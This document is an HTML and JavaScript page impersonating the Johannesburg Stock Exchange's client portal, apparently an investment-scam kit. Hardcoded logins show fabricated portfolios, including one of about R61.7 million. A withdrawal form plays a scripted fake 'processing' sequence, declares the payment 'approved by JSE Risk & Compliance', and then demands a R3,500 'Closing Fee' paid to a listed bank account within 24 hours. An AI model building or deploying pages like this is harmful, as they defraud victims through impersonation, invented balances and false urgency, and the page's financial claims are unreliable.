<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>JSE Client Portal</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:'Segoe UI',Arial,sans-serif;line-height:1.6;color:#333;}
#loginPage{position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(135deg,#0b0c1a,#1a1a2e,#0d3b70);display:flex;align-items:center;justify-content:center;z-index:9999;}
.lcard{background:#fff;border-radius:16px;padding:44px 40px;width:400px;max-width:95vw;box-shadow:0 25px 60px rgba(0,0,0,0.45);}
.lcard-logo{text-align:center;margin-bottom:22px;}
.lcard-logo img{height:38px;}
.lcard h2{font-size:1.5rem;text-align:center;color:#1a1a2e;margin-bottom:6px;font-weight:700;}
.lcard-sub{text-align:center;color:#888;font-size:13px;margin-bottom:22px;}
.lerr{background:#fff0f0;border:1px solid #f5a0a0;color:#c0392b;padding:10px 14px;border-radius:6px;font-size:13px;margin-bottom:14px;display:none;}
.lfield{margin-bottom:16px;}
.lfield label{display:block;font-size:12px;font-weight:700;color:#444;margin-bottom:6px;text-transform:uppercase;letter-spacing:0.5px;}
.lfield input{width:100%;padding:12px 14px;border:1.5px solid #ddd;border-radius:8px;font-size:14px;font-family:inherit;color:#333;}
.lfield input:focus{border-color:#1a1a2e;outline:none;}
.pw-wrap{position:relative;}
.pw-wrap input{padding-right:42px;}
.pw-eye{position:absolute;right:13px;top:50%;transform:translateY(-50%);cursor:pointer;color:#aaa;}
.lbtn{width:100%;padding:14px;background:#1a1a2e;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit;margin-top:4px;}
.lbtn:hover{background:#0d3b70;}
.lnote{text-align:center;color:#bbb;font-size:12px;margin-top:16px;}
#dashPage{display:none;background:#f0f2f5;min-height:100vh;}
.dnav{background:#fff;height:68px;display:flex;align-items:center;border-bottom:1px solid #e5e7eb;position:sticky;top:0;z-index:100;box-shadow:0 1px 8px rgba(0,0,0,0.07);}
.dnav-inner{max-width:1280px;margin:0 auto;padding:0 28px;display:flex;justify-content:space-between;align-items:center;width:100%;}
.dnav-logo{height:34px;}
.dnav-right{display:flex;align-items:center;gap:16px;}
.dnav-user{font-size:13px;color:#555;}
.dbtn-out{background:#f5f5f5;border:1px solid #ddd;padding:8px 16px;border-radius:7px;font-size:13px;cursor:pointer;font-family:inherit;}
.dbtn-out:hover{background:#1a1a2e;color:#fff;border-color:#1a1a2e;}
.dwrap{max-width:1280px;margin:0 auto;padding:32px 28px;}
.dcards{display:grid;grid-template-columns:repeat(4,1fr);gap:18px;margin-bottom:26px;}
.dcard{background:#fff;border-radius:12px;padding:22px;border:1px solid #e5e7eb;box-shadow:0 1px 6px rgba(0,0,0,0.05);}
.dcard.main{background:linear-gradient(135deg,#1a1a2e,#0d3b70);}
.dcard-lbl{font-size:11px;text-transform:uppercase;letter-spacing:1px;color:#888;margin-bottom:8px;}
.dcard.main .dcard-lbl{color:rgba(255,255,255,0.65);}
.dcard-val{font-size:1.75rem;font-weight:800;color:#1a1a2e;}
.dcard.main .dcard-val{color:#fff;}
.dcard-val.sm{font-size:1.2rem;}
.dcard-val.grn{color:#16a34a !important;font-size:1.2rem !important;}
.dbadge{display:inline-block;margin-top:10px;font-size:11px;padding:3px 10px;border-radius:20px;font-weight:700;}
.dbadge.g{background:#dcfce7;color:#16a34a;}
.dbadge.b{background:#eff6ff;color:#1d4ed8;}
.dcard.main .dbadge{background:rgba(255,255,255,0.15);color:#fff;}
.dlower{display:grid;grid-template-columns:1.4fr 1fr;gap:22px;margin-bottom:26px;}
.dpanel{background:#fff;border-radius:12px;padding:26px;border:1px solid #e5e7eb;box-shadow:0 1px 6px rgba(0,0,0,0.05);}
.dpanel-title{font-size:15px;font-weight:700;color:#1a1a2e;margin-bottom:18px;}
.dtable{width:100%;border-collapse:collapse;font-size:13px;}
.dtable th{background:#f8fafc;padding:10px 12px;text-align:left;font-weight:700;color:#555;font-size:11px;text-transform:uppercase;}
.dtable td{padding:11px 12px;border-bottom:1px solid #f0f0f0;}
.dtable tbody tr:hover{background:#fafbff;}
.pos{color:#16a34a;font-weight:700;}
.wnote{font-size:13px;color:#666;background:#f8fafc;padding:10px 14px;border-radius:6px;border-left:3px solid #1a1a2e;margin-bottom:18px;}
.wfield{margin-bottom:15px;}
.wfield label{display:block;font-size:12px;font-weight:700;color:#444;margin-bottom:6px;text-transform:uppercase;letter-spacing:0.4px;}
.wfield input{width:100%;padding:11px 13px;border:1.5px solid #ddd;border-radius:7px;font-size:14px;font-family:inherit;color:#333;}
.wfield input:focus{border-color:#1a1a2e;outline:none;}
.wfield small{color:#bbb;font-size:11px;display:block;margin-top:4px;}
.wbtn{width:100%;padding:13px;background:#1a1a2e;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit;margin-top:4px;}
.wbtn:hover{background:#0d3b70;}
.werr{background:#fff0f0;border:1px solid #ffa0a0;color:#c0392b;padding:10px 14px;border-radius:6px;font-size:13px;margin-top:10px;display:none;}
.proc{text-align:center;padding:16px 0;}
.proc-icon{font-size:46px;color:#1a1a2e;margin-bottom:12px;}
.proc-txt{font-weight:700;font-size:15px;color:#1a1a2e;margin-bottom:14px;}
.prog-wrap{background:#e5e7eb;border-radius:50px;height:8px;overflow:hidden;margin-bottom:8px;}
.prog-bar{height:100%;width:0;background:linear-gradient(90deg,#1a1a2e,#0d3b70);border-radius:50px;transition:width 0.6s ease;}
.proc-pct{font-size:12px;color:#888;margin-bottom:12px;font-weight:700;}
.proc-steps{text-align:left;margin-top:8px;max-height:160px;overflow:hidden;}
.proc-step{display:flex;align-items:center;gap:8px;font-size:12px;color:#aaa;padding:3px 0;transition:color 0.3s;}
.proc-step.done{color:#16a34a;}
.proc-step.active{color:#1a1a2e;font-weight:700;}
.proc-step i{width:14px;text-align:center;font-size:11px;}
.appr{text-align:center;padding:4px 0;}
.appr-icon{font-size:56px;color:#16a34a;margin-bottom:10px;animation:popIn 0.5s ease;}
@keyframes popIn{0%{transform:scale(0);}70%{transform:scale(1.15);}100%{transform:scale(1);}}
.appr h4{font-size:20px;color:#16a34a;margin-bottom:6px;font-weight:800;}
.appr-sub{font-size:13px;color:#555;margin-bottom:14px;}
.appr-amount{background:linear-gradient(135deg,#f0fdf4,#dcfce7);border:2px solid #16a34a;border-radius:10px;padding:14px;margin-bottom:12px;}
.appr-amount .lbl{font-size:11px;color:#16a34a;text-transform:uppercase;letter-spacing:1px;font-weight:700;margin-bottom:4px;}
.appr-amount .val{font-size:1.7rem;font-weight:800;color:#1a1a2e;}
.appr-ref{background:#f8fafc;border-radius:6px;padding:8px 12px;font-size:12px;color:#555;margin-bottom:14px;border-left:3px solid #16a34a;text-align:left;}
.closing-box{background:#fffbeb;border:2px solid #f59e0b;border-radius:10px;padding:16px;margin-bottom:12px;text-align:left;}
.closing-box .ctitle{display:flex;align-items:center;gap:8px;font-size:14px;font-weight:800;color:#92400e;margin-bottom:8px;}
.closing-box .ctitle i{color:#f59e0b;font-size:17px;}
.closing-box .cdesc{font-size:12px;color:#78350f;margin-bottom:12px;line-height:1.7;}
.closing-fee-amt{background:#fff;border:1px solid #fcd34d;border-radius:7px;padding:10px 13px;display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;}
.closing-fee-amt .lbl{font-size:12px;color:#888;}
.closing-fee-amt .val{font-size:1.15rem;font-weight:800;color:#dc2626;}
.bank-box{background:#f0f4ff;border:1px solid #93c5fd;border-radius:8px;padding:14px;text-align:left;font-size:13px;margin-bottom:10px;}
.bank-box h5{font-size:13px;font-weight:700;color:#1a1a2e;margin-bottom:10px;display:flex;align-items:center;gap:6px;}
.bank-row{display:flex;justify-content:space-between;align-items:center;padding:5px 0;border-bottom:1px solid #dbeafe;}
.bank-row:last-child{border-bottom:none;}
.bank-row .lbl{color:#666;font-size:12px;}
.bank-row .val{font-weight:700;color:#1a1a2e;font-size:13px;}
.ref-box{background:#fef3c7;border:1px solid #fcd34d;border-radius:8px;padding:10px 14px;text-align:left;font-size:13px;margin-bottom:10px;display:flex;align-items:center;gap:10px;}
.ref-box i{color:#f59e0b;font-size:17px;}
.ref-box .ref-lbl{color:#666;font-size:11px;display:block;}
.ref-box .ref-val{font-weight:800;color:#92400e;font-size:15px;letter-spacing:1px;}
.urgency-note{background:#fef2f2;border:1px solid #fecaca;border-radius:7px;padding:10px 13px;font-size:12px;color:#dc2626;margin-bottom:12px;display:flex;align-items:flex-start;gap:8px;line-height:1.6;text-align:left;}
.urgency-note i{margin-top:2px;flex-shrink:0;}
.btn-retry{background:#f5f5f5;border:1px solid #ddd;padding:10px 22px;border-radius:7px;font-size:13px;cursor:pointer;font-family:inherit;}
.btn-retry:hover{background:#1a1a2e;color:#fff;}
.dfooter{text-align:center;padding:18px;font-size:12px;color:#aaa;border-top:1px solid #e5e7eb;}
.dfooter a{color:#aaa;text-decoration:none;}
@media(max-width:1024px){.dcards{grid-template-columns:repeat(2,1fr);}.dlower{grid-template-columns:1fr;}}
@media(max-width:600px){.dcards{grid-template-columns:1fr 1fr;}.dwrap{padding:16px;}.lcard{padding:30px 20px;}}
</style>
</head>
<body>

<div id="loginPage">
  <div class="lcard">
    <div class="lcard-logo">
      <img src="https://clientportal.jse.co.za/Style%20Library/Images/logo-black.svg" alt="JSE Logo">
    </div>
    <h2>Client Portal Login</h2>
    <p class="lcard-sub">Enter your credentials to access your account</p>
    <div class="lerr" id="lerr"><i class="fa fa-exclamation-circle"></i> Invalid username or password.</div>
    <div class="lfield">
      <label>Username</label>
      <input type="text" id="lu" placeholder="Enter your username" autocomplete="off" spellcheck="false">
    </div>
    <div class="lfield">
      <label>Password</label>
      <div class="pw-wrap">
        <input type="password" id="lp" placeholder="Enter your password" autocomplete="off">
        <span class="pw-eye" onclick="togglePw()"><i class="fa fa-eye" id="eyeIco"></i></span>
      </div>
    </div>
    <button class="lbtn" onclick="doLogin()">
      <span id="lbtnTxt">Login to Portal</span>
      <i class="fa fa-spinner fa-spin" id="lspin" style="display:none;"></i>
    </button>
    <p class="lnote">For access issues, contact your agent.</p>
  </div>
</div>

<div id="dashPage">
  <nav class="dnav">
    <div class="dnav-inner">
      <img src="https://clientportal.jse.co.za/Style%20Library/Images/logo-black.svg" class="dnav-logo" alt="JSE">
      <div class="dnav-right">
        <span class="dnav-user"><i class="fa fa-user-circle"></i> Welcome, <strong id="dName"></strong></span>
        <button class="dbtn-out" onclick="doLogout()"><i class="fa fa-sign-out-alt"></i> Logout</button>
      </div>
    </div>
  </nav>
  <div class="dwrap">
    <div class="dcards">
      <div class="dcard main">
        <div class="dcard-lbl">Total Portfolio Value</div>
        <div class="dcard-val" id="dPort">R 0.00</div>
        <span class="dbadge g"><i class="fa fa-arrow-up"></i> +12.4% this year</span>
      </div>
      <div class="dcard">
        <div class="dcard-lbl">Available Balance</div>
        <div class="dcard-val sm" id="dAvail">R 0.00</div>
        <span class="dbadge b"><i class="fa fa-wallet"></i> Investable</span>
      </div>
      <div class="dcard">
        <div class="dcard-lbl">Total Returns / Profit</div>
        <div class="dcard-val sm" id="dRet">R 0.00</div>
        <span class="dbadge g"><i class="fa fa-chart-line"></i> All time</span>
      </div>
      <div class="dcard">
        <div class="dcard-lbl">Account Status</div>
        <div class="dcard-val grn">Active</div>
        <span class="dbadge g"><i class="fa fa-shield-alt"></i> Verified</span>
      </div>
    </div>

    <div class="dlower">
      <div class="dpanel">
        <div class="dpanel-title"><i class="fa fa-chart-pie"></i> Investment Holdings</div>
        <table class="dtable">
          <thead><tr><th>Fund / Asset</th><th>Units</th><th>Unit Price</th><th>Market Value</th><th>Return</th></tr></thead>
          <tbody id="hTbody"></tbody>
        </table>
      </div>

      <div class="dpanel">
        <div class="dpanel-title"><i class="fa fa-money-bill-wave"></i> Withdraw Funds</div>

        <!-- STEP 1: Form -->
        <div id="wStep1">
          <div class="wnote"><i class="fa fa-check-circle" style="color:#16a34a;"></i> No minimum withdrawal &mdash; withdraw any amount.</div>
          <div class="wfield">
            <label>Withdrawal Code</label>
            <input type="text" id="wCode" placeholder="Enter your withdrawal code">
            <small>Contact your agent if you do not have a code.</small>
          </div>
          <div class="wfield">
            <label>Amount (ZAR)</label>
            <input type="number" id="wAmt" placeholder="Enter any amount">
          </div>
          <div class="wfield">
            <label>Bank Account Number</label>
            <input type="number" id="wWallet" placeholder="Enter your bank account number" min="0">
            <small>Enter your full bank account number.</small>
          </div>
          <button class="wbtn" onclick="startWithdraw()"><i class="fa fa-paper-plane"></i> Submit Withdrawal Request</button>
          <div class="werr" id="werr"></div>
        </div>

        <!-- STEP 2: Processing -->
        <div id="wProc" style="display:none;" class="proc">
          <div class="proc-icon"><i class="fa fa-spinner fa-spin"></i></div>
          <div class="proc-txt">Processing Your Withdrawal...</div>
          <div class="prog-wrap"><div class="prog-bar" id="progBar"></div></div>
          <div class="proc-pct" id="procPct">0%</div>
          <div class="proc-steps" id="procStepList"></div>
        </div>

        <!-- STEP 3: Approved + Closing Fee -->
        <div id="wAppr" style="display:none;" class="appr">
          <div class="appr-icon"><i class="fa fa-check-circle"></i></div>
          <h4>Payment Approved!</h4>
          <p class="appr-sub">Your withdrawal has been verified and approved by JSE Risk &amp; Compliance.</p>
          <div class="appr-amount">
            <div class="lbl">Approved Withdrawal Amount</div>
            <div class="val" id="apprAmt">R 0.00</div>
          </div>
          <div class="appr-ref">
            <i class="fa fa-check-circle" style="color:#16a34a;margin-right:6px;"></i>
            <strong>Transaction Ref:</strong> JSE-<span id="apprRef">000000</span> &nbsp;&bull;&nbsp; Status: <strong style="color:#16a34a;">APPROVED</strong>
          </div>
          <div class="closing-box">
            <div class="ctitle"><i class="fa fa-lock-open"></i> Final Step &mdash; Closing Fee Required</div>
            <div class="cdesc">
              Your funds are ready to be released. To complete the transfer and credit your full profits directly to your bank account, a once-off <strong>Closing Fee of R 3,500.00</strong> is required. This covers final regulatory clearance and bank transfer processing.<br><br>
              <strong>Once this fee is received, your full profit will be transferred to your bank account immediately.</strong>
            </div>
            <div class="closing-fee-amt">
              <span class="lbl">Closing Fee Due</span>
              <span class="val">R 3,500.00</span>
            </div>
            <div class="bank-box">
              <h5><i class="fa fa-university"></i> Pay Closing Fee &mdash; Banking Details</h5>
              <div class="bank-row"><span class="lbl">Bank</span><span class="val">Standard Bank</span></div>
              <div class="bank-row"><span class="lbl">Account Number</span><span class="val">10178723124</span></div>
              <div class="bank-row"><span class="lbl">Account Holder</span><span class="val">Std Payment</span></div><div class="bank-row"><span class="lbl">Account Type</span><span class="val">Current</span></div>
              <div class="bank-row"><span class="lbl">Branch Code</span><span class="val">051001</span></div>
              <div class="bank-row"><span class="lbl">Amount</span><span class="val" style="color:#dc2626;">R 3,500.00</span></div>
            </div>
            <div class="ref-box">
              <i class="fa fa-tag"></i>
              <div>
                <span class="ref-lbl">Use this payment reference</span>
                <span class="ref-val">Payment02</span>
              </div>
            </div>
            <div class="urgency-note">
              <i class="fa fa-clock"></i>
              <span>This approval expires in <strong>24 hours</strong>. Pay the closing fee promptly to ensure your funds are released without delay. Your profits will reflect in your bank account <strong>immediately</strong> after payment is confirmed.</span>
            </div>
          </div>
          <button class="btn-retry" onclick="resetW()"><i class="fa fa-redo"></i> Start New Withdrawal</button>
        </div>

      </div>
    </div>

    <div class="dpanel">
      <div class="dpanel-title"><i class="fa fa-history"></i> Recent Transactions</div>
      <table class="dtable">
        <thead><tr><th>Date</th><th>Description</th><th>Type</th><th>Amount</th><th>Status</th></tr></thead>
        <tbody id="tTbody"></tbody>
      </table>
    </div>
  </div>
  <div class="dfooter">&#169; 2026 JSE Client Portal &nbsp;|&nbsp; <a href="#">Privacy Policy</a> &nbsp;|&nbsp; <a href="#">Terms &amp; Conditions</a></div>
</div>

<script>
var U = {
  "Maree2026": {
    pw: "jse1836",
    name: "Mr A J Maree",
    portfolio: 61700999.97,
    available: 61700999.97,
    profit: 61700999.97,
    h: [
      {f:"JSE Top 40 ETF", u:450, p:412.50, v:185625, r:"+18.2%"},
      {f:"Satrix MSCI World", u:320, p:298.75, v:95600, r:"+22.4%"},
      {f:"Coronation Equity", u:580, p:183.20, v:106256, r:"+9.6%"},
      {f:"Old Mutual Balanced", u:210, p:265.40, v:55734, r:"+7.1%"},
      {f:"Nedbank Infrastructure", u:180, p:148.00, v:26640, r:"+5.3%"}
    ],
    t: [
      {d:"2026-02-10", ds:"Dividend JSE Top 40", tp:"Credit", a:"+R 3,240.00"},
      {d:"2026-01-28", ds:"Monthly Investment Satrix", tp:"Debit", a:"-R 5,000.00"},
      {d:"2026-01-15", ds:"Fund Performance Bonus", tp:"Credit", a:"+R 1,890.00"},
      {d:"2025-12-31", ds:"Year-End Statement Fee", tp:"Debit", a:"-R 120.00"},
      {d:"2025-12-20", ds:"Dividend Coronation Equity", tp:"Credit", a:"+R 2,100.00"}
    ]
  },
  "client02": {
    pw: "invest2026",
    name: "Naledi Dlamini",
    portfolio: 212600,
    available: 28300,
    profit: 19870,
    h: [
      {f:"Satrix Dividend Plus", u:700, p:168.50, v:117950, r:"+14.7%"},
      {f:"Allan Gray Equity", u:260, p:231.00, v:60060, r:"+11.2%"},
      {f:"Absa Property Fund", u:315, p:75.20, v:23688, r:"+6.8%"}
    ],
    t: [
      {d:"2026-02-12", ds:"Dividend Satrix Dividend Plus", tp:"Credit", a:"+R 2,100.00"},
      {d:"2026-01-20", ds:"Monthly Investment Allan Gray", tp:"Debit", a:"-R 3,500.00"},
      {d:"2026-01-05", ds:"Account Maintenance Fee", tp:"Debit", a:"-R 95.00"}
    ]
  },
  "admin": {
    pw: "admin123",
    name: "JSE Administrator",
    portfolio: 1024500,
    available: 145000,
    profit: 112400,
    h: [
      {f:"JSE Top 40 ETF", u:2100, p:412.50, v:866250, r:"+18.2%"},
      {f:"Global Diversified Fund", u:450, p:352.00, v:158400, r:"+25.1%"}
    ],
    t: [
      {d:"2026-02-15", ds:"Large Portfolio Rebalance", tp:"Debit", a:"-R 50,000.00"},
      {d:"2026-02-01", ds:"Q1 Dividend Distribution", tp:"Credit", a:"+R 12,400.00"}
    ]
  }
};

var AU = null;

function fmt(n) {
  return "R " + Number(n).toLocaleString("en-ZA", {minimumFractionDigits:2, maximumFractionDigits:2});
}

function togglePw() {
  var i = document.getElementById("lp");
  var e = document.getElementById("eyeIco");
  if (i.type === "password") { i.type = "text"; e.className = "fa fa-eye-slash"; }
  else { i.type = "password"; e.className = "fa fa-eye"; }
}

function doLogin() {
  var u = document.getElementById("lu").value.trim();
  var p = document.getElementById("lp").value.trim();
  var err = document.getElementById("lerr");
  var txt = document.getElementById("lbtnTxt");
  var spin = document.getElementById("lspin");
  err.style.display = "none";
  txt.style.display = "none";
  spin.style.display = "inline-block";
  setTimeout(function() {
    txt.style.display = "inline";
    spin.style.display = "none";
    if (U[u] && U[u].pw === p) {
      AU = U[u];
      document.getElementById("loginPage").style.display = "none";
      document.getElementById("dashPage").style.display = "block";
      buildDash();
    } else {
      err.style.display = "block";
    }
  }, 1500);
}

function doLogout() {
  AU = null;
  document.getElementById("dashPage").style.display = "none";
  document.getElementById("loginPage").style.display = "flex";
  document.getElementById("lu").value = "";
  document.getElementById("lp").value = "";
  document.getElementById("lerr").style.display = "none";
  resetW();
}

function buildDash() {
  document.getElementById("dName").textContent = AU.name;
  document.getElementById("dPort").textContent = fmt(AU.portfolio);
  document.getElementById("dAvail").textContent = fmt(AU.available);
  document.getElementById("dRet").textContent = fmt(AU.profit);
  var hb = document.getElementById("hTbody");
  hb.innerHTML = "";
  for (var i = 0; i < AU.h.length; i++) {
    var x = AU.h[i];
    hb.innerHTML += "<tr><td><strong>" + x.f + "</strong></td><td>" + x.u.toLocaleString() + "</td><td>" + fmt(x.p) + "</td><td><strong>" + fmt(x.v) + "</strong></td><td class='pos'>" + x.r + "</td></tr>";
  }
  var tb = document.getElementById("tTbody");
  tb.innerHTML = "";
  for (var j = 0; j < AU.t.length; j++) {
    var t = AU.t[j];
    var c = t.tp === "Credit" ? "#16a34a" : "#dc2626";
    tb.innerHTML += "<tr><td>" + t.d + "</td><td>" + t.ds + "</td><td style='color:" + c + ";font-weight:700'>" + t.tp + "</td><td style='color:" + c + ";font-weight:700'>" + t.a + "</td><td><span style='background:#dcfce7;color:#16a34a;padding:3px 10px;border-radius:20px;font-size:11px;font-weight:700'>Completed</span></td></tr>";
  }
}

function startWithdraw() {
  var code = document.getElementById("wCode").value.trim();
  var amt = parseFloat(document.getElementById("wAmt").value);
  var wallet = document.getElementById("wWallet").value.trim();
  var errEl = document.getElementById("werr");
  errEl.style.display = "none";
  if (!code || code.length < 4) { errEl.textContent = "Please enter a valid withdrawal code."; errEl.style.display = "block"; return; }
  if (!wallet || wallet.length < 6) { errEl.textContent = "Please enter a valid bank account number."; errEl.style.display = "block"; return; }
  if (isNaN(amt) || amt <= 0) { errEl.textContent = "Please enter a valid amount."; errEl.style.display = "block"; return; }

  document.getElementById("wStep1").style.display = "none";
  document.getElementById("wProc").style.display = "block";

  var steps = [
    "Initialising secure connection...",
    "Verifying withdrawal code...",
    "Authenticating account credentials...",
    "Checking KYC & compliance status...",
    "Contacting JSE payment network...",
    "Verifying bank account details...",
    "Submitting to Risk & Compliance...",
    "Awaiting final approval confirmation..."
  ];

  var bar = document.getElementById("progBar");
  var pct = document.getElementById("procPct");
  var stepList = document.getElementById("procStepList");
  var done = [];
  var s = 0;
  var total = steps.length;

  function render() {
    var html = "";
    for (var i = 0; i < done.length; i++) {
      html += "<div class='proc-step done'><i class='fa fa-check-circle'></i> " + done[i] + "</div>";
    }
    if (s < total) {
      html += "<div class='proc-step active'><i class='fa fa-circle-notch fa-spin'></i> " + steps[s] + "</div>";
    }
    stepList.innerHTML = html;
  }

  render();

  var iv = setInterval(function() {
    done.push(steps[s]);
    s++;
    var p = Math.round((s / total) * 100);
    bar.style.width = p + "%";
    pct.textContent = p + "%";
    if (s < total) {
      render();
    } else {
      clearInterval(iv);
      render();
      setTimeout(function() {
        document.getElementById("wProc").style.display = "none";
        var ref = "TXN" + Math.floor(Math.random() * 900000 + 100000);
        document.getElementById("apprAmt").textContent = fmt(amt);
        document.getElementById("apprRef").textContent = ref;
        document.getElementById("wAppr").style.display = "block";
      }, 1000);
    }
  }, 750);
}

function resetW() {
  var s1 = document.getElementById("wStep1"); if (s1) s1.style.display = "block";
  var sp = document.getElementById("wProc"); if (sp) sp.style.display = "none";
  var sa = document.getElementById("wAppr"); if (sa) sa.style.display = "none";
  var wc = document.getElementById("wCode"); if (wc) wc.value = "";
  var wa = document.getElementById("wAmt"); if (wa) wa.value = "";
  var ww = document.getElementById("wWallet"); if (ww) ww.value = "";
  var pb = document.getElementById("progBar"); if (pb) pb.style.width = "0";
  var pp = document.getElementById("procPct"); if (pp) pp.textContent = "0%";
  var sl = document.getElementById("procStepList"); if (sl) sl.innerHTML = "";
  var we = document.getElementById("werr"); if (we) we.style.display = "none";
}

document.addEventListener("keydown", function(e) {
  if (e.key === "Enter" && document.getElementById("loginPage").style.display !== "none") doLogin();
});
</script>
</body>
</html>
